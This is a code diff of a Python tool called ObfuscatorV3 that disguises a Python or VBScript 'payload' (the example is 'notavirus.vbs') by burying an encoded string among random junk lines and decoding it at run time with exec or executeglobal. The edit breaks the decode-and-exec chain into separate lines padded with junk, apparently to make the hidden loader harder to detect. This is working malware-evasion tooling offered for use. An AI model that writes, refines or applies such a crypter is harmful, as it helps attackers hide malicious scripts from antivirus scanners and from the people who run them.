@@ -1,12 +1,12 @@
 #!/usr/bin/env python
 
 '''
-Script Name: 		ObfuscatorV3.py
-Author:      		Levi Von Haxor
-Purpose:     		Obfuscate a Python or VBScript file passed 
+Script Name: 	ObfuscatorV3.py
+Author:      	Levi Von Haxor
+Purpose:     	Obfuscate a Python or VBScript file passed 
 			 	as an argument
 Example:		python ObfuscatorV3.py -v notavirus.vbs
-Return: 		obs_notavirus.vbs (This is the obfuscated file)
+Return: 		obs_notavirus.vbs (This is the payload)
 '''
 
 import random
@@ -71,12 +71,12 @@ def obsVBS(EC):
 	Encoder = "".join(random.choices(list(string.ascii_letters), k=random.randint(5, 15)))    
 
 	with open('obs_' + file, 'w') as f:
-		[f.writelines(junk[:round(len(junk)/10)])]
+		f.writelines(junk[:round(len(junk)/10)])
 		random.shuffle(junk)
 
 		f.write(f'{Encoder} = "{EC}"\n')	
 
-		[f.writelines(junk[:round(len(junk)/10)])]
+		f.writelines(junk[:round(len(junk)/10)])
 		random.shuffle(junk)	
 		
 		f.writelines([f'del = "{delimeter}"\n',
@@ -92,7 +92,7 @@ def obsVBS(EC):
 				'WScript.Sleep(0)\n',
 				'WScript.Sleep(0)\n'])
 		
-		[f.writelines(junk[:round(len(junk)/10)])]
+		f.writelines(junk[:round(len(junk)/10)])
 		random.shuffle(junk)
 
 		f.writelines([f'length_stuff = ubound({Encoder})-1\n',
@@ -117,12 +117,12 @@ def obsVBS(EC):
 				'WScript.Sleep(0)\n',
 				'WScript.Sleep(0)\n'])
 
-		[f.writelines(junk[:round(len(junk)/10)])]
+		f.writelines(junk[:round(len(junk)/10)])
 		random.shuffle(junk)
 
 		f.write('executeglobal (all_char)\n')
 
-		[f.writelines(junk[:round(len(junk)/10)])]
+		f.writelines(junk[:round(len(junk)/10)])
 		random.shuffle(junk)
 	
 
@@ -137,21 +137,36 @@ def obsPY(EC):
 		
 		f.writelines(['import math\n', 'import random\n', 'import string\n', 'import time\n'])
         
-		[f.writelines(junk[:round(len(junk)/10)])]
+		f.writelines(junk[:round(len(junk)/10)])
 		random.shuffle(junk)
 
 		f.write('import base64\n')
-		[f.writelines(junk[:round(len(junk)/10)])]
+		f.writelines(junk[:round(len(junk)/10)])
 		random.shuffle(junk)
 
 		f.write(f"{Encoder} = '{EC}'\n")
 
-		[f.writelines(junk[:round(len(junk)/10)])]
+		f.writelines(junk[:round(len(junk)/10)])
 		random.shuffle(junk)
-		
-		f.write(f'import os,time\n{var1}={Encoder}.encode("ascii");{var2}=base64.b64decode({var1});{var3}={var2}.decode("ascii");{var4}=[chr(int(i)) for i in {var3}.split("{delimeter}") if i];{var5}="".join({var4});{var6} = {var5}.maketrans(string.ascii_letters,string.ascii_letters[::-1]);{var7}= {var5}.translate({var6});exec({var7})\n')
-		
-		[f.writelines(junk[:round(len(junk)/10)])]
+
+		f.write(f'{var1}={Encoder}.encode("ascii")\n')
+		f.writelines(junk[:round(len(junk)/10)])
+		random.shuffle(junk)
+
+		f.write(f'{var2}=base64.b64decode({var1});{var3}={var2}.decode("ascii")\n')
+		f.writelines(junk[:round(len(junk)/10)])
+		random.shuffle(junk)
+
+		f.write(f'{var4}=[chr(int(i)) for i in {var3}.split("{delimeter}") if i];{var5}="".join({var4})\n')
+		f.writelines(junk[:round(len(junk)/10)])
+		random.shuffle(junk)
+
+		f.write(f'{var6} = {var5}.maketrans(string.ascii_letters,string.ascii_letters[::-1]);{var7}= {var5}.translate({var6})\n')
+		f.writelines(junk[:round(len(junk)/10)])
+		random.shuffle(junk)
+
+		f.write(f'exec({var7})\n')         
+		f.writelines(junk[:round(len(junk)/10)])
 			
 
 def main():
